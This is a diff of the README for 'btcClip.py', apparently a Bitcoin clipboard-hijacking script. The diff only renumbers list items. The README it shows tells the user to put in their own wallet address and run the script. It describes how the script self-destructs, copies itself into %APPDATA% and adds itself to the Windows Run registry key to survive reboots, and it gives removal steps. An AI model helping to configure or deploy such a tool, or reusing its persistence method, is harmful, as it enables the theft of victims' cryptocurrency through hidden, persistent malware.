@@ -29,35 +29,35 @@ Startup registry.
 - Add self destruct message
 
 ## How to use
-- Change BTC_ADDRESS to wallet address. 
-- Change self destruct message
-- Run -> ```python btcClip.py```
+1. Change BTC_ADDRESS to wallet address. 
+2. Change self destruct message
+3. Run -> ```python btcClip.py```
 
 ## How it works
 
 When the .py file is run it automatically self destructs and replicates itself to the user's %APPDATA% folder (C:\Users\username\AppData\Roaming). 
 
-- Replicated the .py file
+1. Replicates the .py file
 
 ![Picture 1 ](https://i.ibb.co/6P1WGDM/Screenshot-80.png)
 
 It then adds itself
 to the user's Startup registry (HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run) so that it can run again when the PC is turned on. 
 
-- In the startup registry
+2. Adds to the startup registry
 
 ![Picture 2 ](https://i.ibb.co/Pzxrf9X/Screenshot-81.png)
 
 
 ### How to delete
 
-- Navigate to C:\Users\user\AppData\Roaming or you can type %appdata% on the top of the folder.
+1. Navigate to C:\Users\user\AppData\Roaming or you can type %appdata% on the top of the folder.
 
 ![Picture 3 ](https://i.ibb.co/3F4YMzP/Screenshot-82.png)
 
-- then delete btcClip.py
+2. then delete btcClip.py
 
-- To delete from the registry, open up the Registry Editor for Windows and navigate to > HKEY_LOCAL_MACHINE > SOFTWARE > Microsoft > Windows > CurrentVersion > Run
-- Then right click it and delete
+3. To delete from the registry, open up the Registry Editor for Windows and navigate to > HKEY_LOCAL_MACHINE > SOFTWARE > Microsoft > Windows > CurrentVersion > Run
+4. Then right click it and delete
 
 
